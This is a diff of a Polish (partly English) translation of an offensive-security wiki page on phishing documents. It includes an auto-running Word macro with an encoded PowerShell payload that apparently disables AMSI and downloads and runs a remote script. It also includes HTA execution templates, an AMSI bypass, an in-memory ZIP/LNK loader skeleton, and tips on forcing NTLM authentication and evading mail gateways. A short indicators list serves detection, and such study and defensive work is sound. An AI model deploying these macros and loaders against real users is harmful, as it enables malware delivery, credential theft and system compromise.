@@ -1,40 +1,40 @@
-# Pliki i dokumenty phishingowe
+# Phishing Pliki i dokumenty
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Dokumenty Office
 
-Microsoft Word wykonuje walidację danych pliku przed jego otwarciem. Walidacja danych odbywa się w formie identyfikacji struktury danych, zgodnie ze standardem OfficeOpenXML. Jeśli podczas identyfikacji struktury danych wystąpi jakikolwiek błąd, analizowany plik nie zostanie otwarty.
+Microsoft Word wykonuje walidację danych pliku przed jego otwarciem. Walidacja danych jest przeprowadzana w formie identyfikacji struktur danych, zgodnie ze standardem OfficeOpenXML. Jeśli podczas identyfikacji struktury danych wystąpi błąd, analizowany plik nie zostanie otwarty.
 
-Zazwyczaj pliki Word zawierające makra używają rozszerzenia `.docm`. Jednak możliwe jest zmienienie nazwy pliku poprzez zmianę rozszerzenia i zachowanie zdolności do wykonywania makr.\
-Na przykład plik RTF z założenia nie obsługuje makr, ale plik DOCM przemianowany na RTF zostanie obsłużony przez Microsoft Word i będzie zdolny do wykonywania makr.\
-Te same mechanizmy i mechanizmy wewnętrzne dotyczą całego oprogramowania pakietu Microsoft Office (Excel, PowerPoint etc.).
+Zazwyczaj pliki Word zawierające makra używają rozszerzenia `.docm`. Jednak możliwe jest zmienienie nazwy pliku przez zmianę rozszerzenia i nadal zachować jego możliwość wykonywania makr.\
+Na przykład plik RTF z założenia nie obsługuje makr, ale plik DOCM przemianowany na RTF zostanie obsłużony przez Microsoft Word i będzie zdolny do wykonania makr.\
+Te same wewnętrzne mechanizmy dotyczą całego oprogramowania pakietu Microsoft Office (Excel, PowerPoint itp.).
 
 Możesz użyć następującego polecenia, aby sprawdzić, które rozszerzenia będą wykonywane przez niektóre programy Office:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-Pliki DOCX odwołujące się do zdalnego szablonu (File –Options –Add-ins –Manage: Templates –Go) który zawiera makra mogą również „wykonywać” makra.
+Pliki DOCX odwołujące się do zdalnego szablonu (File –Options –Add-ins –Manage: Templates –Go) który zawiera macros mogą również “wykonywać” macros.
 
 ### Ładowanie zewnętrznego obrazu
 
 Przejdź do: _Insert --> Quick Parts --> Field_\
-_**Kategorie**: Links and References, **Filed names**: includePicture, oraz **Filename or URL**:_ http://<ip>/whatever
+_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever
 
 ![](<../../images/image (155).png>)
 
 ### Macros Backdoor
 
-Można użyć makr do uruchomienia dowolnego kodu z dokumentu.
+Można użyć macros, aby uruchomić dowolny kod z dokumentu.
 
-#### Autoload functions
+#### Funkcje autoload
 
-Im bardziej są powszechne, tym bardziej prawdopodobne, że AV je wykryje.
+Im bardziej powszechne są, tym bardziej prawdopodobne, że AV je wykryje.
 
 - AutoOpen()
 - Document_Open()
 
-#### Macros Code Examples
+#### Przykłady kodu macros
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -64,14 +64,14 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
-#### Ręczne usunięcie metadanych
+#### Ręczne usuwanie metadanych
 
 Przejdź do **File > Info > Inspect Document > Inspect Document**, co otworzy Document Inspector. Kliknij **Inspect**, a następnie **Remove All** obok **Document Properties and Personal Information**.
 
-#### Rozszerzenie dokumentu
+#### Doc Extension
 
-Po zakończeniu wybierz listę rozwijaną **Save as type**, zmień format z **`.docx`** na **Word 97-2003 `.doc`**.\
-Zrób to, ponieważ **nie możesz zapisać macro's inside a `.docx`** i istnieje **stigma** **around** the macro-enabled **`.docm`** extension (e.g. the thumbnail icon has a huge `!` and some web/email gateway block them entirely). Therefore, this **legacy `.doc` extension is the best compromise**.
+When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
+Zrób to, ponieważ **nie można zapisać macros inside a `.docx`** i istnieje **piętno** wokół rozszerzenia macro-enabled **`.docm`** (np. ikona miniatury ma ogromne `!` i niektóre bramki sieciowe/emailowe blokują je całkowicie). Dlatego to **legacy `.doc` extension jest najlepszym kompromisem**.
 
 #### Malicious Macros Generators
 
@@ -81,9 +81,9 @@ Zrób to, ponieważ **nie możesz zapisać macro's inside a `.docx`** i istnieje
 
 ## Pliki HTA
 
-HTA to program Windows, który **kombinuje HTML i języki skryptowe (takie jak VBScript i JScript)**. Tworzy interfejs użytkownika i wykonuje się jako aplikacja "fully trusted", bez ograniczeń modelu bezpieczeństwa przeglądarki.
+HTA to program Windows, który **łączy HTML i języki skryptowe (takie jak VBScript i JScript)**. Tworzy interfejs użytkownika i uruchamia się jako w pełni zaufana aplikacja, bez ograniczeń modelu bezpieczeństwa przeglądarki.
 
-HTA jest uruchamiane za pomocą **`mshta.exe`**, który jest zwykle **installed** razem z **Internet Explorer**, co sprawia, że **`mshta` dependant on IE**. Jeśli więc został odinstalowany, HTA nie będą mogły zostać uruchomione.
+HTA jest uruchamiany za pomocą **`mshta.exe`**, które jest zazwyczaj **zainstalowane** razem z **Internet Explorer**, co sprawia, że **`mshta` jest zależne od IE**. Jeśli więc Internet Explorer został odinstalowany, HTA nie będą mogły się uruchomić.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -138,9 +138,9 @@ var_func
 self.close
 </script>
 ```
-## Wymuszanie uwierzytelniania NTLM
+## Wymuszanie uwierzytelnienia NTLM
 
-Istnieje kilka sposobów, aby **wymusić uwierzytelnianie NTLM "zdalnie"**, na przykład możesz dodać **niewidoczne obrazy** do e‑maili lub HTML, które użytkownik otworzy (nawet HTTP MitM?). Albo wysłać ofierze **adresy plików**, które **wywołają** **uwierzytelnianie** przy samym **otwarciu folderu.**
+Istnieje kilka sposobów na **wymuszenie uwierzytelnienia NTLM "zdalnie"**, na przykład możesz dodać **niewidoczne obrazy** do e-maili lub HTML, które użytkownik otworzy (nawet HTTP MitM?). Albo wysłać ofierze **adres plików**, który **wywoła** **uwierzytelnienie** już przy **otwarciu folderu.**
 
 **Sprawdź te pomysły i więcej na następujących stronach:**
 
@@ -156,22 +156,22 @@ Istnieje kilka sposobów, aby **wymusić uwierzytelnianie NTLM "zdalnie"**, na p
 
 ### NTLM Relay
 
-Nie zapomnij, że możesz nie tylko ukraść hasha lub dane uwierzytelniające, ale także **wykonać NTLM relay attacks**:
+Nie zapomnij, że nie można tylko ukraść hasha lub uwierzytelnienia, lecz także **przeprowadzić NTLM relay attacks**:
 
 - [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
 - [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 ## LNK Loaders + ZIP-Embedded Payloads (fileless chain)
 
-Bardzo skuteczne kampanie dostarczają ZIP zawierający dwa legalne dokumenty-wabiki (PDF/DOCX) oraz złośliwy .lnk. Sztuczka polega na tym, że faktyczny PowerShell loader jest przechowywany w surowych bajtach ZIP-a po unikalnym markerze, a .lnk wydziela go i uruchamia w całości w pamięci.
+Bardzo skuteczne kampanie dostarczają ZIP zawierający dwa legalne dokumenty przynęty (PDF/DOCX) oraz złośliwy plik .lnk. Sztuczka polega na tym, że właściwy loader PowerShell jest zapisany wewnątrz surowych bajtów ZIP po unikalnym markerze, a .lnk wyodrębnia go i uruchamia całkowicie w pamięci.
 
 Typowy przebieg realizowany przez .lnk PowerShell one-liner:
 
-1) Znajdź oryginalny ZIP w typowych lokalizacjach: Desktop, Downloads, Documents, %TEMP%, %ProgramData% oraz w katalogu nadrzędnym bieżącego katalogu roboczego.  
-2) Odczytaj bajty ZIP-a i znajdź w nim zakodowany marker (np. xFIQCV). Wszystko po markerze to osadzony PowerShell payload.  
-3) Skopiuj ZIP do %ProgramData%, rozpakuj go tam i otwórz dokument-wabik (.docx), aby wyglądać wiarygodnie.  
-4) Obejdź AMSI dla bieżącego procesu: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
-5) Deobfuskować następny etap (np. usuwając wszystkie znaki #) i wykonać go w pamięci.
+1) Znajdź oryginalny ZIP w typowych ścieżkach: Desktop, Downloads, Documents, %TEMP%, %ProgramData% oraz w folderze nadrzędnym bieżącego katalogu roboczego.
+2) Odczytaj bajty ZIP i znajdź na stałe wpisany marker (np. xFIQCV). Wszystko po markerze to osadzony ładunek PowerShell.
+3) Skopiuj ZIP do %ProgramData%, rozpakuj tam i otwórz przynętę .docx, aby wyglądało to na legalne.
+4) Obejście AMSI dla bieżącego procesu: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
+5) Deobfuskacja następnego etapu (np. usunięcie wszystkich znaków #) i wykonanie go w pamięci.
 
 Przykładowy szkielet PowerShell do wyodrębnienia i uruchomienia osadzonego etapu:
 ```powershell
@@ -191,32 +191,32 @@ $code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
 Invoke-Expression $code
 ```
 Notatki
-- Dostarczenie często nadużywa renomowanych subdomen PaaS (np. *.herokuapp.com) i może ograniczać dostęp do payloads (serwując nieszkodliwe ZIPs w zależności od IP/UA).
-- Kolejny etap często odszyfrowuje base64/XOR shellcode i wykonuje go przez Reflection.Emit + VirtualAlloc, aby zminimalizować artefakty na dysku.
+- Delivery często nadużywa zaufanych subdomen PaaS (np. *.herokuapp.com) i może ograniczać dostęp do payloadów (serwując nieszkodliwe pliki ZIP w zależności od IP/UA).
+- Kolejny etap często odszyfrowuje base64/XOR shellcode i wykonuje go za pomocą Reflection.Emit + VirtualAlloc, aby zminimalizować artefakty na dysku.
 
-Persistence używane w tym samym łańcuchu
-- COM TypeLib hijacking kontrolki Microsoft Web Browser, tak że IE/Explorer lub dowolna aplikacja osadzająca ją automatycznie ponownie uruchamia payload. Zobacz szczegóły i gotowe komendy tutaj:
+Persistence używana w tym samym łańcuchu
+- COM TypeLib hijacking of the Microsoft Web Browser control tak, aby IE/Explorer lub każda aplikacja osadzająca go automatycznie ponownie uruchamiała payload. Szczegóły i gotowe do użycia polecenia znajdziesz tutaj:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
 {{#endref}}
 
 Hunting/IOCs
-- Pliki ZIP zawierające ciąg znaków ASCII (np. xFIQCV) dopisany do danych archiwum.
-- .lnk, który przeszukuje foldery nadrzędne/użytkownika, aby zlokalizować ZIP i otwiera fałszywy dokument.
-- Manipulacja AMSI za pomocą [System.Management.Automation.AmsiUtils]::amsiInitFailed.
+- Pliki ZIP zawierające ASCII marker string (np. xFIQCV) dopisane do danych archiwum.
+- Plik .lnk, który przegląda foldery nadrzędne/użytkownika, aby znaleźć ZIP i otwiera fałszywy dokument.
+- Manipulacje AMSI poprzez [System.Management.Automation.AmsiUtils]::amsiInitFailed.
 - Długotrwałe wątki biznesowe kończące się linkami hostowanymi pod zaufanymi domenami PaaS.
 
-## Pliki Windows do kradzieży hashów NTLM
+## Windows files to steal NTLM hashes
 
-Sprawdź stronę dotyczącą **places to steal NTLM creds**:
+Sprawdź stronę o **places to steal NTLM creds**:
 
 {{#ref}}
 ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
 {{#endref}}
 
 
-## Źródła
+## Referencje
 
 - [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
 - [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
